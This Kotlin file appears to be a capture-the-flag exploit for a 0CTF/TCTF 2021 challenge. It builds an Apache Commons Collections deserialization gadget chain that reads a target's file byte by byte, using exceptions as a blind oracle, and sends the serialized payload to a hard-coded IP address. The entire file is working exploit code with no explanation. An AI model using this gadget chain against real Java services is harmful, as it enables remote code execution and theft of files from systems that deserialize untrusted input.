package ccl

import okhttp3.HttpUrl
import okhttp3.OkHttpClient
import okhttp3.Request
import okio.Buffer
import org.apache.commons.collections.functors.*
import java.io.ObjectOutputStream
import java.net.URL


object Blind {

    private val client = OkHttpClient()

    fun guess(index: Int, c: Char): Boolean {
        val gadget = Gadget.chain(
            ConstantTransformer(URL("file:///flag")),
            InvokerTransformer("openConnection", null, null),
            InvokerTransformer("getInputStream", null, null),
            ClosureTransformer(
                ForClosure(index, TransformerClosure(InvokerTransformer("read", null, null)))
            ),
            InvokerTransformer("read", null, null),
            ClosureTransformer(
                IfClosure(
                    EqualPredicate(c.code),
                    NOPClosure.getInstance(),
                    ExceptionClosure.getInstance()
                )
            ),
        )
        return send(gadget)
    }

    private fun send(gadget: Any): Boolean {
        val payload = Buffer().also {
            ObjectOutputStream(it.outputStream()).run {
                writeUTF("0CTF/TCTF")
                writeInt(2021)
                writeObject(gadget)
                flush()
            }
        }.readByteString().hex()
        val url = HttpUrl.Builder()
            .scheme("http")
            .host("121.4.155.228")
            .addPathSegment("buggy")
            .addQueryParameter("data", payload)
            .build()
        val request = Request.Builder().url(url).build()
        val response = client.newCall(request).execute()
        return response.isSuccessful
    }
}
